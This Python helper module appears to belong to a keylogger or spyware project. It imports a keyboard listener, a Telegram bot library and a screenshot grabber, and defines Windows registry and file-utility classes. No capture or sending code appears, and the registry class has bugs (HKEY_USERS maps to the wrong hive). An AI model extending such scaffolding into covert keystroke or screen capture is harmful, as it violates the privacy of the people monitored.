import winreg
from pynput.keyboard import Listener  # Escucha eventos del teclado
import os  # Lib para copiar archivos
import ctypes
import sys
#import socket  # Verifica internet
import threading  # procesos multihilos
from datetime import datetime  # Devuelve fecha y hora actual
import datetime  # Devuelve fecha y hora actual
import random  # Genera numeros
import telepot  # Telegram API
import string  # Lib genera textos
import time  # Contar segundos
import cv2 # Lib IA
import eel # Entorno gráfico con HTML/ CSS / JS
from shutil import rmtree  # Remove foldes with files
from PIL import ImageGrab  # Take Screenshot


class WinRegistry:
    def __init__(self, path):
        self.afterPath = path
        self.HKEY = None
        self.__listHKEY = [
            'HKEY_CLASSES_ROOT',
            'HKEY_CURRENT_USER',
            'HKEY_LOCAL_MACHINE',
            'HKEY_DYN_DATA',
            'HKEY_PERFORMANCE_DATA',
            'HKEY_USERS',
            'HKEY_CURRENT_CONFIG']

        for hkey in self.__listHKEY:
            index = self.afterPath.find(hkey)  # getting boot index
            if index != -1:  # Only if it was successful
                if str(hkey) == 'HKEY_CLASSES_ROOT':
                    self.HKEY = winreg.HKEY_CLASSES_ROOT
                elif str(hkey) == 'HKEY_CURRENT_USER':
                    self.HKEY = winreg.HKEY_CURRENT_USER
                elif str(hkey) == 'HKEY_LOCAL_MACHINE':
                    self.HKEY = winreg.HKEY_LOCAL_MACHINE
                elif str(hkey) == 'HKEY_DYN_DATA':
                    self.HKEY = winreg.HKEY_DYN_DATA
                elif str(hkey) == 'HKEY_PERFORMANCE_DATA':
                    self.HKEY = winreg.HKEY_PERFORMANCE_DATA
                elif str(hkey) == 'HKEY_USERS':
                    self.HKEY = winreg.HKEY_CLASSES_ROOT
                elif str(hkey) == 'HKEY_CURRENT_CONFIG':
                    self.HKEY = winreg.HKEY_CURRENT_CONFIG
                else:
                    print('Error path invalido')
                index = index + len(hkey) + 1  # Index cut
                end = len(self.afterPath)  # End cut
                self.afterPath = self.afterPath[index:end]  # cut path

    def __format_after_path(self):
        afterPath = self.afterPath
        if afterPath != "":
            return afterPath + "\\"
        else:
            return afterPath

    def __create_value(self, type, nameValue, value):
        self.create_key('')
        opened_key = winreg.OpenKey(self.HKEY, self.afterPath, 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(opened_key, nameValue, 0, type, value)
        opened_key.Close()

    def create_key(self, keyName):
        winreg.CreateKeyEx(self.HKEY, self.__format_after_path() + keyName, 0, winreg.KEY_ALL_ACCESS)

    def delete_key(self, keyName):
        try:
            winreg.DeleteKeyEx(self.HKEY, self.__format_after_path() + keyName, winreg.KEY_ALL_ACCESS, 0)
        except:
            pass

    def read_value(self, nameValue):
        # Open key
        opened_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.afterPath, 0,
                                    winreg.KEY_ALL_ACCESS)  # Error if key is emply
        # Create value
        f = winreg.QueryValueEx(opened_key, nameValue)
        print(f[0])
        return f[0]

    def set_value_String(self, nameValue, value):
        self.__create_value(winreg.REG_SZ, nameValue, value)

    def set_value_Binary(self, nameValue, value):
        self.__create_value(winreg.REG_BINARY, nameValue, value)

    def set_value_DWORD(self, nameValue, value):
        self.__create_value(winreg.REG_DWORD, nameValue, value)

    def set_value_QWORD(self, nameValue, value):
        self.__create_value(winreg.REG_QWORD, nameValue, value)

    def set_value_MultiString(self, nameValue, value):
        self.__create_value(winreg.REG_MULTI_SZ, nameValue, value)

    def set_value_ExpandableString(self, nameValue, value):
        self.__create_value(winreg.REG_EXPAND_SZ, nameValue, value)

    def delete_value(self, nameValue):
        try:
            # Open key
            opened_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.afterPath, 0,
                                        winreg.KEY_ALL_ACCESS)  # Error if key is emply
            # Create value
            winreg.DeleteValue(opened_key, nameValue)
        except:
            pass

class Util:
    def create_folder(self, path):
        try:  # Intenta crear la dirección
            os.makedirs(path)
            print("[CreateFolders] Success create folder: " + path)
        except:
            print("[CreateFolders] Folder really exist: " + path)


    def delete_folder(self, folder):
        try:
            rmtree(folder)
            print("[CreateFolders] Success remove folder and files: " + folder)
        except:
            print("[CreateFolders] Mistake while was remove folder and files" + folder)

    def current_time(self):
        T = datetime.datetime.now()
        return T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + " " + T.strftime(
            "%I") + " " + T.strftime("%M") + " " + T.strftime("%p")

    def random_char(self, number=4):  # Genera letras aleatorias [Longitud según el argumento]
        return ''.join(random.choice(string.ascii_letters) for x in range(number))

    def delete_cache(self, path):
        try:
            os.removedirs(path)
        except:
            pass

    def is_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def split_string(self, n, st):
        lst = ['']
        for i in str(st):
            l = len(lst) - 1
            if len(lst[l]) < n:
                lst[l] += i
            else:
                lst += [i]
        return lst

    def save_file(self, path, text, mode="a"):
        subPath = path[0:path.rfind("\\")]  # Recorta el path, y obtiene el sub path
        self.create_folder(subPath)
        print(subPath)
        file = open(path, mode)
        file.write(text)
        file.close()

if __name__ == '__main__':

    pass